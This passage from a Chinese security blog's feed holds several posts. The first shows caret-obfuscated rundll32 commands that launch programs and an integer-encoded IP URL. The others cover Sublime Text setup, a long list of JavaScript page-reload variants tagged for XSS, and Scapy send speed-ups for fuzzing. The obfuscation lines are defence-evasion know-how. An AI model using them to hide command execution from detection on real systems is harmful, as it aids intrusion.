      <content type="html"><![CDATA[<h2 id="0×00-Protocol-handler混淆"><a href="#0×00-Protocol-handler混淆" class="headerlink" title="0×00 Protocol handler混淆"></a>0×00 Protocol handler混淆</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^<span class="number">3</span>^<span class="number">2</span>^/^c^a^l^c^.^e^x^e</span><br><span class="line">rundll32 url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^<span class="number">3</span>^<span class="number">2</span>^/^c^a^l^c^.^e^x^e</span><br><span class="line">rundll32 url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^<span class="number">3</span>^<span class="number">2</span>^/^c^a^l^c^.^e^x^e</span><br><span class="line">r^u^n^d^l^l3^<span class="number">2</span> u^r^l^.^d^l^l^,^O^p^e^n^U^R^L f^i^l^e://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^<span class="number">3</span>^<span class="number">2</span>^/^c^a^l^c^.^e^x^e</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/05/22/5b0383c0370a7.png" alt="cale.png"></p><p>另一种访问url的方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 url.dll,OpenURL http://^2^8^9^9^9^0^9^3^8^0^/</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/05/22/5b038546af44c.png" alt="google.png"></p><p>注：<br>其实这里访问的是<a href="http://2899909380" target="_blank" rel="noopener">http://2899909380</a>，但是访问之后会跳转到<a href="http://www.google.com，原理如下：" target="_blank" rel="noopener">www.google.com，原理如下：</a></p><blockquote><pre><code>String = 172.217.27.4Binary = 10101100 . 11011001 . 00011011 . 00000100Integer = 2899909380</code></pre><p>通过十六进制/二进制/整型的转换，达到了混淆的效果。</p></blockquote>]]></content>
      
      
        <tags>
            
            <tag> Protocol handler，混淆 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Sublime Text 3 使用配置</title>
      <link href="/2018/05/01/Sublime_Text_3%20%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE/"/>
      <url>/2018/05/01/Sublime_Text_3%20%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE/</url>
      <content type="html"><![CDATA[<h2 id="0x01-安装Package-Control"><a href="#0x01-安装Package-Control" class="headerlink" title="0x01 安装Package Control"></a>0x01 安装Package Control</h2><blockquote><ol><li>view——show console:</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request,os,hashlib; h = &apos;6f4c264a24d933ce70df5dedcf1dcaee&apos; + &apos;ebe013ee18cced0ef93d5f746d80ef60&apos;; pf = &apos;Package Control.sublime-package&apos;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( &apos;http://packagecontrol.io/&apos; + pf.replace(&apos; &apos;, &apos;%20&apos;)).read(); dh = hashlib.sha256(by).hexdigest(); print(&apos;Error validating download (got %s instead of %s), please try manual install&apos; % (dh, h)) if dh != h else open(os.path.join( ipp, pf), &apos;wb&apos; ).write(by)</span><br></pre></td></tr></table></figure><h2 id="0x02-安装插件"><a href="#0x02-安装插件" class="headerlink" title="0x02 安装插件"></a>0x02 安装插件</h2><blockquote><ol><li>Ctrl+Shift+P ；</li><li>输入“install”，选择“Install Package”；</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-- ConvertToUTF8：支持 GBK, BIG5, EUC-KR, EUC-JP, Shift_JIS 等编码的插件；</span><br><span class="line"></span><br><span class="line">-- Bracket Highlighter：用于匹配括号，引号和html标签。对于很长的代码很有用。安装好之后，不需要设置插件会自动生效；</span><br><span class="line"></span><br><span class="line">-- DocBlockr：DocBlockr可以自动生成PHPDoc风格的注释。它支持的语言有Javascript, PHP, ActionScript, CoffeeScript, Java, Objective C, C, C++；</span><br><span class="line">-- Emmet(Zen Coding)：快速生成HTML代码段的插件，强大到无与伦比，不知道的请自行google；</span><br><span class="line"></span><br><span class="line">-- SideBar Enhancements：这个插件改进了侧边栏，增加了许多功能；</span><br><span class="line"></span><br><span class="line">-- Themr：主题管理，切换主题的时候，不用自己修改配置文件了，用这个可以方便的切换主题；</span><br></pre></td></tr></table></figure><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="https://www.52pojie.cn/thread-664680-1-1.html" target="_blank" rel="noopener">【Sublime Text 3 绝对神器的真正用法】https://www.52pojie.cn/thread-664680-1-1.html</a></p>]]></content>
      
      
        <tags>
            
            <tag> sublime text 3 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>535 Way to reload the page with JS</title>
      <link href="/2017/06/20/%E3%80%90%E8%BD%AC%E3%80%91535%E7%A7%8D%E6%96%B9%E5%BC%8F%E9%87%8D%E6%96%B0%E5%8A%A0%E8%BD%BD%E9%A1%B5%E9%9D%A2/"/>
      <url>/2017/06/20/%E3%80%90%E8%BD%AC%E3%80%91535%E7%A7%8D%E6%96%B9%E5%BC%8F%E9%87%8D%E6%96%B0%E5%8A%A0%E8%BD%BD%E9%A1%B5%E9%9D%A2/</url>
      <content type="html"><![CDATA[<h2 id="0×00-原文"><a href="#0×00-原文" class="headerlink" title="0×00 原文"></a>0×00 原文</h2><p><a href="http://www.phpied.com/files/location-location/location-location.html" target="_blank" rel="noopener">原文链接: … and a 534 other ways to reload the page with JavaScript</a></p><h2 id="0×01-…-and-a-534-other-ways-to-reload-the-page-with-JavaScript"><a href="#0×01-…-and-a-534-other-ways-to-reload-the-page-with-JavaScript" class="headerlink" title="0×01 … and a 534 other ways to reload the page with JavaScript"></a>0×01 … and a 534 other ways to reload the page with JavaScript</h2><p>location = location<br>location = location.href<br>location = window.location<br>location = self.location<br>location = window.location.href<br>location = self.location.href<br>location = location[‘href’]<br>location = window[‘location’]<br>location = window[‘location’].href<br>location = window[‘location’][‘href’]<br>location = window.location[‘href’]<br>location = self[‘location’]<br>location = self[‘location’].href<br>location = self[‘location’][‘href’]<br>location = self.location[‘href’]<br>location.assign(location)<br>location.replace(location)<br>window.location.assign(location)<br>window.location.replace(location)<br>self.location.assign(location)<br>self.location.replace(location)<br>location[‘assign’](location)<br>location[‘replace’](location)<br>window.location[‘assign’](location)<br>window.location[‘replace’](location)<br>window[‘location’].assign(location)<br>window[‘location’].replace(location)<br>window[‘location’][‘assign’](location)<br>window[‘location’][‘replace’](location)<br>self.location[‘assign’](location)<br>self.location[‘replace’](location)<br>self[‘location’].assign(location)<br>self[‘location’].replace(location)<br>self[‘location’][‘assign’](location)<br>self[‘location’][‘replace’](location)<br>location.href = location<br>location.href = location.href<br>location.href = window.location<br>location.href = self.location<br>location.href = window.location.href<br>location.href = self.location.href<br>location.href = location[‘href’]<br>location.href = window[‘location’]<br>location.href = window[‘location’].href<br>location.href = window[‘location’][‘href’]<br>location.href = window.location[‘href’]<br>location.href = self[‘location’]<br>location.href = self[‘location’].href<br>location.href = self[‘location’][‘href’]<br>location.href = self.location[‘href’]<br>location.assign(location.href)<br>location.replace(location.href)<br>window.location.assign(location.href)<br>window.location.replace(location.href)<br>self.location.assign(location.href)<br>self.location.replace(location.href)<br>location[‘assign’](location.href)<br>location[‘replace’](location.href)<br>window.location[‘assign’](location.href)<br>window.location[‘replace’](location.href)<br>window[‘location’].assign(location.href)<br>window[‘location’].replace(location.href)<br>window[‘location’][‘assign’](location.href)<br>window[‘location’][‘replace’](location.href)<br>self.location[‘assign’](location.href)<br>self.location[‘replace’](location.href)<br>self[‘location’].assign(location.href)<br>self[‘location’].replace(location.href)<br>self[‘location’][‘assign’](location.href)<br>self[‘location’][‘replace’](location.href)<br>window.location = location<br>window.location = location.href<br>window.location = window.location<br>window.location = self.location<br>window.location = window.location.href<br>window.location = self.location.href<br>window.location = location[‘href’]<br>window.location = window[‘location’]<br>window.location = window[‘location’].href<br>window.location = window[‘location’][‘href’]<br>window.location = window.location[‘href’]<br>window.location = self[‘location’]<br>window.location = self[‘location’].href<br>window.location = self[‘location’][‘href’]<br>window.location = self.location[‘href’]<br>location.assign(window.location)<br>location.replace(window.location)<br>window.location.assign(window.location)<br>window.location.replace(window.location)<br>self.location.assign(window.location)<br>self.location.replace(window.location)<br>location[‘assign’](window.location)<br>location[‘replace’](window.location)<br>window.location[‘assign’](window.location)<br>window.location[‘replace’](window.location)<br>window[‘location’].assign(window.location)<br>window[‘location’].replace(window.location)<br>window[‘location’][‘assign’](window.location)<br>window[‘location’][‘replace’](window.location)<br>self.location[‘assign’](window.location)<br>self.location[‘replace’](window.location)<br>self[‘location’].assign(window.location)<br>self[‘location’].replace(window.location)<br>self[‘location’][‘assign’](window.location)<br>self[‘location’][‘replace’](window.location)<br>self.location = location<br>self.location = location.href<br>self.location = window.location<br>self.location = self.location<br>self.location = window.location.href<br>self.location = self.location.href<br>self.location = location[‘href’]<br>self.location = window[‘location’]<br>self.location = window[‘location’].href<br>self.location = window[‘location’][‘href’]<br>self.location = window.location[‘href’]<br>self.location = self[‘location’]<br>self.location = self[‘location’].href<br>self.location = self[‘location’][‘href’]<br>self.location = self.location[‘href’]<br>location.assign(self.location)<br>location.replace(self.location)<br>window.location.assign(self.location)<br>window.location.replace(self.location)<br>self.location.assign(self.location)<br>self.location.replace(self.location)<br>location[‘assign’](self.location)<br>location[‘replace’](self.location)<br>window.location[‘assign’](self.location)<br>window.location[‘replace’](self.location)<br>window[‘location’].assign(self.location)<br>window[‘location’].replace(self.location)<br>window[‘location’][‘assign’](self.location)<br>window[‘location’][‘replace’](self.location)<br>self.location[‘assign’](self.location)<br>self.location[‘replace’](self.location)<br>self[‘location’].assign(self.location)<br>self[‘location’].replace(self.location)<br>self[‘location’][‘assign’](self.location)<br>self[‘location’][‘replace’](self.location)<br>window.location.href = location<br>window.location.href = location.href<br>window.location.href = window.location<br>window.location.href = self.location<br>window.location.href = window.location.href<br>window.location.href = self.location.href<br>window.location.href = location[‘href’]<br>window.location.href = window[‘location’]<br>window.location.href = window[‘location’].href<br>window.location.href = window[‘location’][‘href’]<br>window.location.href = window.location[‘href’]<br>window.location.href = self[‘location’]<br>window.location.href = self[‘location’].href<br>window.location.href = self[‘location’][‘href’]<br>window.location.href = self.location[‘href’]<br>location.assign(window.location.href)<br>location.replace(window.location.href)<br>window.location.assign(window.location.href)<br>window.location.replace(window.location.href)<br>self.location.assign(window.location.href)<br>self.location.replace(window.location.href)<br>location[‘assign’](window.location.href)<br>location[‘replace’](window.location.href)<br>window.location[‘assign’](window.location.href)<br>window.location[‘replace’](window.location.href)<br>window[‘location’].assign(window.location.href)<br>window[‘location’].replace(window.location.href)<br>window[‘location’][‘assign’](window.location.href)<br>window[‘location’][‘replace’](window.location.href)<br>self.location[‘assign’](window.location.href)<br>self.location[‘replace’](window.location.href)<br>self[‘location’].assign(window.location.href)<br>self[‘location’].replace(window.location.href)<br>self[‘location’][‘assign’](window.location.href)<br>self[‘location’][‘replace’](window.location.href)<br>self.location.href = location<br>self.location.href = location.href<br>self.location.href = window.location<br>self.location.href = self.location<br>self.location.href = window.location.href<br>self.location.href = self.location.href<br>self.location.href = location[‘href’]<br>self.location.href = window[‘location’]<br>self.location.href = window[‘location’].href<br>self.location.href = window[‘location’][‘href’]<br>self.location.href = window.location[‘href’]<br>self.location.href = self[‘location’]<br>self.location.href = self[‘location’].href<br>self.location.href = self[‘location’][‘href’]<br>self.location.href = self.location[‘href’]<br>location.assign(self.location.href)<br>location.replace(self.location.href)<br>window.location.assign(self.location.href)<br>window.location.replace(self.location.href)<br>self.location.assign(self.location.href)<br>self.location.replace(self.location.href)<br>location[‘assign’](self.location.href)<br>location[‘replace’](self.location.href)<br>window.location[‘assign’](self.location.href)<br>window.location[‘replace’](self.location.href)<br>window[‘location’].assign(self.location.href)<br>window[‘location’].replace(self.location.href)<br>window[‘location’][‘assign’](self.location.href)<br>window[‘location’][‘replace’](self.location.href)<br>self.location[‘assign’](self.location.href)<br>self.location[‘replace’](self.location.href)<br>self[‘location’].assign(self.location.href)<br>self[‘location’].replace(self.location.href)<br>self[‘location’][‘assign’](self.location.href)<br>self[‘location’][‘replace’](self.location.href)<br>location[‘href’] = location<br>location[‘href’] = location.href<br>location[‘href’] = window.location<br>location[‘href’] = self.location<br>location[‘href’] = window.location.href<br>location[‘href’] = self.location.href<br>location[‘href’] = location[‘href’]<br>location[‘href’] = window[‘location’]<br>location[‘href’] = window[‘location’].href<br>location[‘href’] = window[‘location’][‘href’]<br>location[‘href’] = window.location[‘href’]<br>location[‘href’] = self[‘location’]<br>location[‘href’] = self[‘location’].href<br>location[‘href’] = self[‘location’][‘href’]<br>location[‘href’] = self.location[‘href’]<br>location.assign(location[‘href’])<br>location.replace(location[‘href’])<br>window.location.assign(location[‘href’])<br>window.location.replace(location[‘href’])<br>self.location.assign(location[‘href’])<br>self.location.replace(location[‘href’])<br>location[‘assign’](location[‘href’])<br>location[‘replace’](location[‘href’])<br>window.location[‘assign’](location[‘href’])<br>window.location[‘replace’](location[‘href’])<br>window[‘location’].assign(location[‘href’])<br>window[‘location’].replace(location[‘href’])<br>window[‘location’][‘assign’](location[‘href’])<br>window[‘location’][‘replace’](location[‘href’])<br>self.location[‘assign’](location[‘href’])<br>self.location[‘replace’](location[‘href’])<br>self[‘location’].assign(location[‘href’])<br>self[‘location’].replace(location[‘href’])<br>self[‘location’][‘assign’](location[‘href’])<br>self[‘location’][‘replace’](location[‘href’])<br>window[‘location’] = location<br>window[‘location’] = location.href<br>window[‘location’] = window.location<br>window[‘location’] = self.location<br>window[‘location’] = window.location.href<br>window[‘location’] = self.location.href<br>window[‘location’] = location[‘href’]<br>window[‘location’] = window[‘location’]<br>window[‘location’] = window[‘location’].href<br>window[‘location’] = window[‘location’][‘href’]<br>window[‘location’] = window.location[‘href’]<br>window[‘location’] = self[‘location’]<br>window[‘location’] = self[‘location’].href<br>window[‘location’] = self[‘location’][‘href’]<br>window[‘location’] = self.location[‘href’]<br>location.assign(window[‘location’])<br>location.replace(window[‘location’])<br>window.location.assign(window[‘location’])<br>window.location.replace(window[‘location’])<br>self.location.assign(window[‘location’])<br>self.location.replace(window[‘location’])<br>location[‘assign’](window[‘location’])<br>location[‘replace’](window[‘location’])<br>window.location[‘assign’](window[‘location’])<br>window.location[‘replace’](window[‘location’])<br>window[‘location’].assign(window[‘location’])<br>window[‘location’].replace(window[‘location’])<br>window[‘location’][‘assign’](window[‘location’])<br>window[‘location’][‘replace’](window[‘location’])<br>self.location[‘assign’](window[‘location’])<br>self.location[‘replace’](window[‘location’])<br>self[‘location’].assign(window[‘location’])<br>self[‘location’].replace(window[‘location’])<br>self[‘location’][‘assign’](window[‘location’])<br>self[‘location’][‘replace’](window[‘location’])<br>window[‘location’].href = location<br>window[‘location’].href = location.href<br>window[‘location’].href = window.location<br>window[‘location’].href = self.location<br>window[‘location’].href = window.location.href<br>window[‘location’].href = self.location.href<br>window[‘location’].href = location[‘href’]<br>window[‘location’].href = window[‘location’]<br>window[‘location’].href = window[‘location’].href<br>window[‘location’].href = window[‘location’][‘href’]<br>window[‘location’].href = window.location[‘href’]<br>window[‘location’].href = self[‘location’]<br>window[‘location’].href = self[‘location’].href<br>window[‘location’].href = self[‘location’][‘href’]<br>window[‘location’].href = self.location[‘href’]<br>location.assign(window[‘location’].href)<br>location.replace(window[‘location’].href)<br>window.location.assign(window[‘location’].href)<br>window.location.replace(window[‘location’].href)<br>self.location.assign(window[‘location’].href)<br>self.location.replace(window[‘location’].href)<br>location[‘assign’](window[‘location’].href)<br>location[‘replace’](window[‘location’].href)<br>window.location[‘assign’](window[‘location’].href)<br>window.location[‘replace’](window[‘location’].href)<br>window[‘location’].assign(window[‘location’].href)<br>window[‘location’].replace(window[‘location’].href)<br>window[‘location’][‘assign’](window[‘location’].href)<br>window[‘location’][‘replace’](window[‘location’].href)<br>self.location[‘assign’](window[‘location’].href)<br>self.location[‘replace’](window[‘location’].href)<br>self[‘location’].assign(window[‘location’].href)<br>self[‘location’].replace(window[‘location’].href)<br>self[‘location’][‘assign’](window[‘location’].href)<br>self[‘location’][‘replace’](window[‘location’].href)<br>window[‘location’][‘href’] = location<br>window[‘location’][‘href’] = location.href<br>window[‘location’][‘href’] = window.location<br>window[‘location’][‘href’] = self.location<br>window[‘location’][‘href’] = window.location.href<br>window[‘location’][‘href’] = self.location.href<br>window[‘location’][‘href’] = location[‘href’]<br>window[‘location’][‘href’] = window[‘location’]<br>window[‘location’][‘href’] = window[‘location’].href<br>window[‘location’][‘href’] = window[‘location’][‘href’]<br>window[‘location’][‘href’] = window.location[‘href’]<br>window[‘location’][‘href’] = self[‘location’]<br>window[‘location’][‘href’] = self[‘location’].href<br>window[‘location’][‘href’] = self[‘location’][‘href’]<br>window[‘location’][‘href’] = self.location[‘href’]<br>location.assign(window[‘location’][‘href’])<br>location.replace(window[‘location’][‘href’])<br>window.location.assign(window[‘location’][‘href’])<br>window.location.replace(window[‘location’][‘href’])<br>self.location.assign(window[‘location’][‘href’])<br>self.location.replace(window[‘location’][‘href’])<br>location[‘assign’](window[‘location’][‘href’])<br>location[‘replace’](window[‘location’][‘href’])<br>window.location[‘assign’](window[‘location’][‘href’])<br>window.location[‘replace’](window[‘location’][‘href’])<br>window[‘location’].assign(window[‘location’][‘href’])<br>window[‘location’].replace(window[‘location’][‘href’])<br>window[‘location’][‘assign’](window[‘location’][‘href’])<br>window[‘location’][‘replace’](window[‘location’][‘href’])<br>self.location[‘assign’](window[‘location’][‘href’])<br>self.location[‘replace’](window[‘location’][‘href’])<br>self[‘location’].assign(window[‘location’][‘href’])<br>self[‘location’].replace(window[‘location’][‘href’])<br>self[‘location’][‘assign’](window[‘location’][‘href’])<br>self[‘location’][‘replace’](window[‘location’][‘href’])<br>window.location[‘href’] = location<br>window.location[‘href’] = location.href<br>window.location[‘href’] = window.location<br>window.location[‘href’] = self.location<br>window.location[‘href’] = window.location.href<br>window.location[‘href’] = self.location.href<br>window.location[‘href’] = location[‘href’]<br>window.location[‘href’] = window[‘location’]<br>window.location[‘href’] = window[‘location’].href<br>window.location[‘href’] = window[‘location’][‘href’]<br>window.location[‘href’] = window.location[‘href’]<br>window.location[‘href’] = self[‘location’]<br>window.location[‘href’] = self[‘location’].href<br>window.location[‘href’] = self[‘location’][‘href’]<br>window.location[‘href’] = self.location[‘href’]<br>location.assign(window.location[‘href’])<br>location.replace(window.location[‘href’])<br>window.location.assign(window.location[‘href’])<br>window.location.replace(window.location[‘href’])<br>self.location.assign(window.location[‘href’])<br>self.location.replace(window.location[‘href’])<br>location[‘assign’](window.location[‘href’])<br>location[‘replace’](window.location[‘href’])<br>window.location[‘assign’](window.location[‘href’])<br>window.location[‘replace’](window.location[‘href’])<br>window[‘location’].assign(window.location[‘href’])<br>window[‘location’].replace(window.location[‘href’])<br>window[‘location’][‘assign’](window.location[‘href’])<br>window[‘location’][‘replace’](window.location[‘href’])<br>self.location[‘assign’](window.location[‘href’])<br>self.location[‘replace’](window.location[‘href’])<br>self[‘location’].assign(window.location[‘href’])<br>self[‘location’].replace(window.location[‘href’])<br>self[‘location’][‘assign’](window.location[‘href’])<br>self[‘location’][‘replace’](window.location[‘href’])<br>self[‘location’] = location<br>self[‘location’] = location.href<br>self[‘location’] = window.location<br>self[‘location’] = self.location<br>self[‘location’] = window.location.href<br>self[‘location’] = self.location.href<br>self[‘location’] = location[‘href’]<br>self[‘location’] = window[‘location’]<br>self[‘location’] = window[‘location’].href<br>self[‘location’] = window[‘location’][‘href’]<br>self[‘location’] = window.location[‘href’]<br>self[‘location’] = self[‘location’]<br>self[‘location’] = self[‘location’].href<br>self[‘location’] = self[‘location’][‘href’]<br>self[‘location’] = self.location[‘href’]<br>location.assign(self[‘location’])<br>location.replace(self[‘location’])<br>window.location.assign(self[‘location’])<br>window.location.replace(self[‘location’])<br>self.location.assign(self[‘location’])<br>self.location.replace(self[‘location’])<br>location[‘assign’](self[‘location’])<br>location[‘replace’](self[‘location’])<br>window.location[‘assign’](self[‘location’])<br>window.location[‘replace’](self[‘location’])<br>window[‘location’].assign(self[‘location’])<br>window[‘location’].replace(self[‘location’])<br>window[‘location’][‘assign’](self[‘location’])<br>window[‘location’][‘replace’](self[‘location’])<br>self.location[‘assign’](self[‘location’])<br>self.location[‘replace’](self[‘location’])<br>self[‘location’].assign(self[‘location’])<br>self[‘location’].replace(self[‘location’])<br>self[‘location’][‘assign’](self[‘location’])<br>self[‘location’][‘replace’](self[‘location’])<br>self[‘location’].href = location<br>self[‘location’].href = location.href<br>self[‘location’].href = window.location<br>self[‘location’].href = self.location<br>self[‘location’].href = window.location.href<br>self[‘location’].href = self.location.href<br>self[‘location’].href = location[‘href’]<br>self[‘location’].href = window[‘location’]<br>self[‘location’].href = window[‘location’].href<br>self[‘location’].href = window[‘location’][‘href’]<br>self[‘location’].href = window.location[‘href’]<br>self[‘location’].href = self[‘location’]<br>self[‘location’].href = self[‘location’].href<br>self[‘location’].href = self[‘location’][‘href’]<br>self[‘location’].href = self.location[‘href’]<br>location.assign(self[‘location’].href)<br>location.replace(self[‘location’].href)<br>window.location.assign(self[‘location’].href)<br>window.location.replace(self[‘location’].href)<br>self.location.assign(self[‘location’].href)<br>self.location.replace(self[‘location’].href)<br>location[‘assign’](self[‘location’].href)<br>location[‘replace’](self[‘location’].href)<br>window.location[‘assign’](self[‘location’].href)<br>window.location[‘replace’](self[‘location’].href)<br>window[‘location’].assign(self[‘location’].href)<br>window[‘location’].replace(self[‘location’].href)<br>window[‘location’][‘assign’](self[‘location’].href)<br>window[‘location’][‘replace’](self[‘location’].href)<br>self.location[‘assign’](self[‘location’].href)<br>self.location[‘replace’](self[‘location’].href)<br>self[‘location’].assign(self[‘location’].href)<br>self[‘location’].replace(self[‘location’].href)<br>self[‘location’][‘assign’](self[‘location’].href)<br>self[‘location’][‘replace’](self[‘location’].href)<br>self[‘location’][‘href’] = location<br>self[‘location’][‘href’] = location.href<br>self[‘location’][‘href’] = window.location<br>self[‘location’][‘href’] = self.location<br>self[‘location’][‘href’] = window.location.href<br>self[‘location’][‘href’] = self.location.href<br>self[‘location’][‘href’] = location[‘href’]<br>self[‘location’][‘href’] = window[‘location’]<br>self[‘location’][‘href’] = window[‘location’].href<br>self[‘location’][‘href’] = window[‘location’][‘href’]<br>self[‘location’][‘href’] = window.location[‘href’]<br>self[‘location’][‘href’] = self[‘location’]<br>self[‘location’][‘href’] = self[‘location’].href<br>self[‘location’][‘href’] = self[‘location’][‘href’]<br>self[‘location’][‘href’] = self.location[‘href’]<br>location.assign(self[‘location’][‘href’])<br>location.replace(self[‘location’][‘href’])<br>window.location.assign(self[‘location’][‘href’])<br>window.location.replace(self[‘location’][‘href’])<br>self.location.assign(self[‘location’][‘href’])<br>self.location.replace(self[‘location’][‘href’])<br>location[‘assign’](self[‘location’][‘href’])<br>location[‘replace’](self[‘location’][‘href’])<br>window.location[‘assign’](self[‘location’][‘href’])<br>window.location[‘replace’](self[‘location’][‘href’])<br>window[‘location’].assign(self[‘location’][‘href’])<br>window[‘location’].replace(self[‘location’][‘href’])<br>window[‘location’][‘assign’](self[‘location’][‘href’])<br>window[‘location’][‘replace’](self[‘location’][‘href’])<br>self.location[‘assign’](self[‘location’][‘href’])<br>self.location[‘replace’](self[‘location’][‘href’])<br>self[‘location’].assign(self[‘location’][‘href’])<br>self[‘location’].replace(self[‘location’][‘href’])<br>self[‘location’][‘assign’](self[‘location’][‘href’])<br>self[‘location’][‘replace’](self[‘location’][‘href’])<br>self.location[‘href’] = location<br>self.location[‘href’] = location.href<br>self.location[‘href’] = window.location<br>self.location[‘href’] = self.location<br>self.location[‘href’] = window.location.href<br>self.location[‘href’] = self.location.href<br>self.location[‘href’] = location[‘href’]<br>self.location[‘href’] = window[‘location’]<br>self.location[‘href’] = window[‘location’].href<br>self.location[‘href’] = window[‘location’][‘href’]<br>self.location[‘href’] = window.location[‘href’]<br>self.location[‘href’] = self[‘location’]<br>self.location[‘href’] = self[‘location’].href<br>self.location[‘href’] = self[‘location’][‘href’]<br>self.location[‘href’] = self.location[‘href’]<br>location.assign(self.location[‘href’])<br>location.replace(self.location[‘href’])<br>window.location.assign(self.location[‘href’])<br>window.location.replace(self.location[‘href’])<br>self.location.assign(self.location[‘href’])<br>self.location.replace(self.location[‘href’])<br>location[‘assign’](self.location[‘href’])<br>location[‘replace’](self.location[‘href’])<br>window.location[‘assign’](self.location[‘href’])<br>window.location[‘replace’](self.location[‘href’])<br>window[‘location’].assign(self.location[‘href’])<br>window[‘location’].replace(self.location[‘href’])<br>window[‘location’][‘assign’](self.location[‘href’])<br>window[‘location’][‘replace’](self.location[‘href’])<br>self.location[‘assign’](self.location[‘href’])<br>self.location[‘replace’](self.location[‘href’])<br>self[‘location’].assign(self.location[‘href’])<br>self[‘location’].replace(self.location[‘href’])<br>self[‘location’][‘assign’](self.location[‘href’])<br>self[‘location’][‘replace’](self.location[‘href’])<br>location.reload()<br>location[‘reload’]()<br>window.location.reload()<br>window[‘location’].reload()<br>window.location[‘reload’]()<br>window[‘location’][‘reload’]()<br>self.location.reload()<br>self[‘location’].reload()<br>self.location[‘reload’]()<br>self[‘location’][‘reload’]()</p>]]></content>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
            <tag> Javascript </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Improve Scapy Send Function Performance</title>
      <link href="/2017/03/21/Scapy%E6%8F%90%E9%80%9F/"/>
      <url>/2017/03/21/Scapy%E6%8F%90%E9%80%9F/</url>
      <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>前几天一直在想着折腾一个Fuzz脚本,但是因为考虑到交互的原因,所以对发包的要求,所以对发包的速度还没有特别的要求,只是在最大程度上需要保证接收和发送,之前也有尝试使用其他一些TCP工具来测试.  </p><blockquote><ul><li>TCP的端口到65535(所以再快又能多块)  </li></ul></blockquote><h2 id="0x01-阴差阳错"><a href="#0x01-阴差阳错" class="headerlink" title="0x01 阴差阳错"></a>0x01 阴差阳错</h2><p>在看MITMf的源码,在作者的Github上看了GithubPage的主页,就瞅了一眼发现了这篇很有用的东西.如何提高Scapy send的性能.  </p><p><img src="https://ooo.0o0.ooo/2017/05/08/59101e4da00fc.png" alt="send函数返回gensend函数.png">  </p><p>文中提到在scapy的sendrecv.py的源码中找到了send()函数以及返回的__gen_send()函数,在代码中看到了s.close这句代码,所以在每次send之后都会把socket在断掉,这样的话明显会消耗时间.  </p><p><img src="https://ooo.0o0.ooo/2017/05/08/59101e4d9eaf6.png" alt="sendrecv的py文件中的close地方.png">   </p><p>然后通过查找,最终在scapypipes.py文件中找到了  </p><blockquote><pre><code>s = conf.L3socket(iface=interface)  </code></pre></blockquote><p>所以可以提速测试一下了,小脚本的代码也就稍微的做了改变:  </p><p><img src="https://ooo.0o0.ooo/2017/05/08/59101e4da3010.png" alt="scapy提速后的代码.png"></p><p>运行代码之后,速度岂止是提高了一倍,是太明显的提速,截图是运行脚本测试发送1000个syn包的时间:  </p><blockquote><pre><code>time python test.py  </code></pre></blockquote><p><img src="https://ooo.0o0.ooo/2017/05/08/59101e4e23f6d.png" alt="发送1000个数据包的时间.png"></p><p>最后奉上原文链接:  </p><p><a href="https://byt3bl33d3r.github.io/mad-max-scapy-improving-scapys-packet-sending-performance.html" target="_blank" rel="noopener">https://byt3bl33d3r.github.io/mad-max-scapy-improving-scapys-packet-sending-performance.html</a></p>]]></content>
      
      
        <tags>
            
            <tag> Scapy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Scapy-TCP-fuzz v0.3</title>
      <link href="/2017/03/16/scapy-TCP-fuzz%E5%8D%87%E7%BA%A70-3/"/>
      <url>/2017/03/16/scapy-TCP-fuzz%E5%8D%87%E7%BA%A70-3/</url>
